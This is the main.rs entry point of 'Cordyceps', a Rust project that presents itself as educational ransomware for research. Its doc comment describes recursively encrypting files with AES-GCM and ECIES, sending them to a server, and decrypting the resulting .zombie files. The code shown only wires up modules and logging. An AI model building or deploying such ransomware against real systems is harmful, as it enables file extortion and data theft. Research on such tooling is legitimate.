//! # Cordyceps
//!
//! **Cordyceps** is an educational, Rust-based command-line ransomware
//! designed for academic and research purposes. It demonstrates the core
//! mechanisms of file encryption, exfiltration, and decryption using modern
//! cryptographic practices.
//!
//! It provides robust capabilities to:
//! - Recursively encrypt files using **AES-GCM 256-bit** and
//! **ECIES (ED25519)**, then securely transmit them to a server.
//! - Decrypt previously encrypted `.zombie` files back to their original
//! state.
//!
//! ## Usage
//! To run Cordyceps, navigate to the project root and use `cargo run`.
//! For a full list of command-line options and detailed usage examples, refer
//! to the project's [README.md](https://github.com/lopes/cordyceps).
//!
//! ```sh
//! cordyceps help
//! ```
//!
//! ## Contributing & License
//! Contributions are welcome! Please see the
//! [CONTRIBUTING.md](https://github.com/lopes/cordyceps) file for guidelines.
//!
//! This project is licensed under the **MIT License**.
//!
//! ---

mod cli;
mod crypto;
mod error;
mod fsutils;

use log::error;

fn main() {
    env_logger::init();

    if let Err(e) = cli::run() {
        error!("Cordyceps error: {}", e);
        std::process::exit(1);
    }
}
